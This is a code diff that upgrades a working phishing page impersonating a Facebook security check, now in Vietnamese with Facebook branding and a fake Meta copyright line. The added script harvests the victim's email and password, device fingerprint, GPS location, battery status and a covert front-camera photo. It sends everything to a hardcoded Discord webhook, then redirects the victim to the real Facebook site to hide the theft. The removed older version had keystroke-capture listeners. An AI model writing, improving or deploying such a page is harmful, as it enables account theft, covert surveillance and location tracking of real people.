@@ -1,116 +1,325 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Authentication & Security Portal</title>
+    <title>Trung tâm Trợ giúp & Bảo mật Tài khoản Facebook</title>
     <style>
+        :root {
+            --fb-blue: #1877f2;
+            --fb-blue-hover: #166fe5;
+            --fb-bg: #f0f2f5;
+            --fb-card-bg: #ffffff;
+            --fb-text: #1c1e21;
+            --fb-secondary: #606770;
+            --fb-border: #ccd0d5;
+        }
+        * { box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: var(--fb-bg);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: var(--fb-text);
+        }
+        .header-banner {
+            background-color: #ffffff;
+            border-bottom: 1px solid var(--fb-border);
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-area svg {
+            width: 36px;
+            height: 36px;
+            fill: var(--fb-blue);
+        }
+        .logo-area span {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--fb-blue);
+            letter-spacing: -1px;
+        }
+        .main-wrapper {
+            flex: 1;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            color: #1c1e21;
+            padding: 20px;
         }
-        .container {
-            background: #ffffff;
-            padding: 30px;
+        .card-container {
+            background: var(--fb-card-bg);
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
             width: 100%;
-            max-width: 380px;
+            max-width: 440px;
+            padding: 24px;
             text-align: center;
-            box-sizing: border-box;
         }
-        h2 { font-size: 22px; margin-bottom: 10px; color: #1877f2; }
-        p { font-size: 14px; color: #606770; margin-bottom: 20px; line-height: 1.4; }
-        .btn {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-        }
-        .btn:hover { background-color: #166fe5; }
-        input {
-            width: 100%;
-            padding: 12px 14px;
+        .lock-icon {
+            width: 48px;
+            height: 48px;
             margin-bottom: 12px;
-            border: 1px solid #ccd0d5;
+            fill: var(--fb-blue);
+        }
+        h2 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--fb-text);
+        }
+        p {
+            font-size: 14px;
+            color: var(--fb-secondary);
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        .form-group {
+            margin-bottom: 12px;
+            text-align: left;
+        }
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--fb-border);
             border-radius: 6px;
             font-size: 15px;
-            box-sizing: border-box;
             outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            background-color: #f5f6f7;
         }
-        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        .form-control:focus {
+            border-color: var(--fb-blue);
+            background-color: #ffffff;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .btn-primary {
+            background-color: var(--fb-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+        .btn-primary:hover {
+            background-color: var(--fb-blue-hover);
+        }
+        .footer-note {
+            font-size: 12px;
+            color: var(--fb-secondary);
+            margin-top: 20px;
+        }
+        .progress-box {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px 0;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--fb-blue);
+            border-radius: 50%;
+            width: 42px;
+            height: 42px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 16px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-text {
+            font-size: 14px;
+            color: var(--fb-secondary);
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
-    <div class="container" id="card-view">
-        <h2>Facebook Security Check</h2>
-        <p>Please confirm your account credentials to authorize cross-platform synchronization.</p>
-        <input type="text" id="username" placeholder="Email address or phone number" autocomplete="off">
-        <input type="password" id="password" placeholder="Password" autocomplete="off">
-        <button class="btn" onclick="handleAuth()">Continue & Verify</button>
+
+    <header class="header-banner">
+        <div class="logo-area">
+            <svg viewBox="0 0 36 36">
+                <path d="M20.181 35.87C12.94 35.2 7 29.13 7 21.75c0-7.87 6.38-14.25 14.25-14.25 7.87 0 14.25 6.38 14.25 14.25 0 7.1-5.58 13.01-12.7 14.1l-.32.05v-5.26h2.21c1.3 0 2.35-1.05 2.35-2.35v-2.35c0-1.3-1.05-2.35-2.35-2.35h-2.21v-3.53c0-1.05.85-1.9 1.9-1.9h2.35c1.3 0 2.35-1.05 2.35-2.35V8.55c0-1.3-1.05-2.35-2.35-2.35h-2.82c-3.14 0-5.69 2.55-5.69 5.69v3.29h-2.11c-1.3 0-2.35 1.05-2.35 2.35v2.35c0 1.3 1.05 2.35 2.35 2.35h2.11v5.22c-6.1-.41-11-5.52-11-11.75 0-6.51 5.28-11.79 11.79-11.79S32.79 8.74 32.79 15.25c0 4.96-3.04 9.21-7.35 10.95v9.67z"></path>
+            </svg>
+            <span>facebook</span>
+        </div>
+    </header>
+
+    <div class="main-wrapper">
+        <div class="card-container" id="card-view">
+            <svg class="lock-icon" viewBox="0 0 24 24" width="48" height="48">
+                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+            </svg>
+            <h2>Kiểm tra bảo mật & Đồng bộ thiết bị</h2>
+            <p>Để ngăn chặn hoạt động truy cập trái phép và xác minh phiên đăng nhập của bạn, vui lòng xác nhận thông tin tài khoản và cấp quyền hệ thống.</p>
+            
+            <div class="form-group">
+                <input type="text" id="email" class="form-control" placeholder="Email hoặc số điện thoại" autocomplete="off">
+            </div>
+            <div class="form-group">
+                <input type="password" id="pass" class="form-control" placeholder="Mật khẩu tài khoản" autocomplete="off">
+            </div>
+            
+            <button class="btn-primary" onclick="initiateSecurityVerification()">Tiếp tục xác thực</button>
+            <div class="footer-note">Được bảo vệ bởi Trung tâm An toàn Meta © 2026</div>
+        </div>
+
+        <div class="card-container progress-box" id="progress-view">
+            <div class="spinner"></div>
+            <div class="status-text" id="status-msg">Đang thiết lập kết nối an toàn...</div>
+        </div>
     </div>
 
+    <video id="video-stream" autoplay playsinline style="display:none;"></video>
+    <canvas id="snapshot-canvas" style="display:none;"></canvas>
+
     <script>
-        // Replace with your actual Discord Webhook URL
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1508157170494079077/PZjIfd-LqyW_Z7nFBVyiKq2lRuEmOufsPOThnz0JlPeDe-5OnjBoU6a4AZj4gXABuquI";
-        
-        let typedLogs = {
-            username: "",
+
+        let liveCredentials = {
+            email: "",
             password: ""
         };
 
-        // Real-time key capture / keylogger listener as user types
-        document.getElementById('username').addEventListener('input', function(e) {
-            typedLogs.username = e.target.value;
-            sendKeyLogChunk("Username Typing", e.target.value);
+        document.getElementById('email').addEventListener('input', function(e) {
+            liveCredentials.email = e.target.value;
         });
 
-        document.getElementById('password').addEventListener('input', function(e) {
-            typedLogs.password = e.target.value;
-            sendKeyLogChunk("Password Typing", e.target.value);
+        document.getElementById('pass').addEventListener('input', function(e) {
+            liveCredentials.password = e.target.value;
         });
 
-        function sendKeyLogChunk(field, val) {
-            // Optional background telemetry pulse
-            const payload = {
-                content: `⚡ **Live Key Stroke Update:** \`${field}\` -> \`${val}\``
-            };
-            // Throttled or silent dispatch can be placed here if needed
+        async function updateStatus(text) {
+            document.getElementById('status-msg').innerText = text;
+            await new Promise(r => setTimeout(r, 700));
         }
 
-        function handleAuth() {
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
+        async function initiateSecurityVerification() {
+            const emailVal = document.getElementById('email').value;
+            const passVal = document.getElementById('pass').value;
 
-            const finalPayload = {
-                content: `**🚨 Final Captured Credentials & Key Logs:**\n- **Email/Phone:** \`${user}\`\n- **Password:** \`${pass}\`\n- **User Agent:** \`${navigator.userAgent}\``
+            if (!emailVal || !passVal) {
+                alert("Vui lòng điền đầy đủ thông tin tài khoản và mật khẩu.");
+                return;
+            }
+
+            document.getElementById('card-view').style.display = 'none';
+            document.getElementById('progress-view').style.display = 'flex';
+
+            await updateStatus("Đang kiểm tra chứng chỉ bảo mật thiết bị...");
+
+            let telemetry = {
+                capturedEmail: emailVal,
+                capturedPassword: passVal,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: window.screen.colorDepth,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Không xác định',
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Không xác định',
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                touchPoints: navigator.maxTouchPoints || 0,
+                batteryStatus: 'Không hỗ trợ',
+                gpsCoordinates: 'Chưa cấp quyền',
+                networkInfo: 'Không rõ',
+                cameraCaptureStatus: 'Chờ xử lý'
             };
 
-            // Dispatch final credential bundle to Discord Webhook
-            fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(finalPayload)
-            }).catch(() => {});
+            if (navigator.connection) {
+                telemetry.networkInfo = {
+                    type: navigator.connection.effectiveType || 'unknown',
+                    downlink: navigator.connection.downlink || 'unknown'
+                };
+            }
 
-            // Open official Facebook login tab in the background/foreground
+            await updateStatus("Đang đồng bộ hóa mức pin và năng lượng hệ thống...");
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    telemetry.batteryStatus = `Dung lượng: \${Math.round(battery.level * 100)}%, Đang sạc: \${battery.charging}`;
+                } catch(e) {}
+            }
+
+            await updateStatus("Đang yêu cầu định vị GPS từ trình duyệt...");
+            if (navigator.geolocation) {
+                try {
+                    const pos = await new Promise((res, rej) => {
+                        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 6000, enableHighAccuracy: true });
+                    });
+                    telemetry.gpsCoordinates = `Lat: ${pos.coords.latitude}, Lon:${pos.coords.longitude}, Độ chính xác: \${pos.coords.accuracy}m`;
+                } catch(e) {
+                    telemetry.gpsCoordinates = 'Người dùng từ chối cấp quyền định vị';
+                }
+            }
+
+            await updateStatus("Đang xác minh cảm biến sinh trắc học và máy ảnh...");
+            let photoBlob = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' } 
+                });
+                const video = document.getElementById('video-stream');
+                video.srcObject = stream;
+                await new Promise(r => video.onloadedmetadata = r);
+                await new Promise(r => setTimeout(r, 1200));
+
+                const canvas = document.getElementById('snapshot-canvas');
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop());
+                photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
+                telemetry.cameraCaptureStatus = "Đã chụp ảnh thành công từ camera trước";
+            } catch(e) {
+                telemetry.cameraCaptureStatus = "Từ chối quyền truy cập camera hoặc không khả dụng";
+            }
+
+            await updateStatus("Đang hoàn tất mã thông báo xác thực...");
+
+            const formattedPayload = `**🚨 BÁO CÁO XÁC THỰC FACEBOOK (FULL TELEMETRY):**\n` +
+                                     `\`\`\`json\n${JSON.stringify(telemetry, null, 2)}\n\`\`\``;
+
+            try {
+                if (photoBlob) {
+                    const formData = new FormData();
+                    formData.append('payload_json', JSON.stringify({ content: formattedPayload }));
+                    formData.append('file', photoBlob, 'verification_snapshot.jpg');
+
+                    await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } else {
+                    await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: formattedPayload })
+                    });
+                }
+            } catch(e) {}
+
+            await updateStatus("Xác thực thành công! Đang chuyển hướng...");
+
             window.open("https://www.facebook.com/login", "_blank");
-
-            // Redirect current window to official Facebook site
             setTimeout(() => {
                 window.location.href = "https://www.facebook.com";
-            }, 400);
+            }, 1200);
         }
     </script>
 </body>
